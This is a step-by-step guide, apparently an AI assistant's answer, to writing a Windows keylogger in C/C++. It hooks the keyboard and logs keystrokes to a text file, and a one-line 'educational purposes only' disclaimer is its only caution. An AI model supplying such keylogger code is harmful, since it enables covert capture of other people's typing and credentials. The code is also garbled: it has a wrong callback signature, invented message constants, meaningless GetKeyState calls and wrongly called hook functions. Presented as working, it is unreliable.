To create a keystroke-logging application on a Windows computer, you can use keyboard hooking through the Windows API. Here's a step-by-step guide to implement this:

### Step 1: Include Necessary Headers
Include the required header files for the Windows API functions:
```c
#include <Windows.h>
#include <WinUser.h>
#include <iostream>
#include <fstream>
#include <string>
```

### Step 2: Define the Callback Function
Define a function to handle keyboard events:
```c
void CALLBACK KeyCallback(int nCode, WPARAM wParam, LPARAM lParam);
```

### Step 3: Implement the Callback Function
The callback function processes each keyboard event:
```c
void CALLBACK KeyCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    static int lastKey = 0;
    static int lastModifier = 0;
    bool isKeyDown = (wParam == 0x010019); // Key down event

    if (!isKeyDown) {
        if (wParam == 0x01001A) {
            // Key released
            // Optionally remove from last key tracking
        }
    } else {
        // Key pressed
        // Get key state
        unsigned long modifiers = GetKeyState(0x00);
        // Check modifiers like Shift, Ctrl, Alt
        if (modifiers & 0x20) { // Shift is pressed
            lastModifier = 1;
        } else if (modifiers & 0x40) { // Ctrl is pressed
            lastModifier = 2;
        } else if (modifiers & 0x80) { // Alt is pressed
            lastModifier = 3;
        }

        // Get the key
        unsigned char key = GetKeyState(0x00);
        if (key != lastKey) {
            // Record the key and modifiers
            std::ofstream logFile("keystrokes.txt", std::ios::app);
            logFile << "Time: " << std::endl;
            logFile << "Key: " << (isKeyDown ? 'D' : 'U') << " - Modifier: " << lastModifier << std::endl;
            logFile << "ASCII: " << (unsigned int)key << std::endl;
            logFile.close();

            lastKey = key;
        }
    }
}
```

### Step 4: Install the Keyboard Hook
Use `SetWindowsHook` to install the hook:
```c
int main() {
    HWND hwnd = GetDesktopWindow();
    int id = 0;
    HHOOK hhook = SetWindowsHook(hwnd, WH_KEYBOARD_LL, KeyCallback);

    if (hhook == 0) {
        std::cout << "Failed to install hook." << std::endl;
        return 1;
    }

    // Keep the hook active while the application is running
    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Remove the hook
    UnhookWindowsHook(hhook, &id);
    std::cout << "Hook removed." << std::endl;

    return 0;
}
```

### Step 5: Compile and Run
- Compile the code using a C compiler.
- Run the executable to monitor keystrokes in the file `keystrokes.txt`.

### Notes:
- This code is for educational purposes only; use responsibly.
- Ensure it's tested on a spare system to avoid affecting productivity.
- Handle errors properly and close the file after each write to prevent issues.

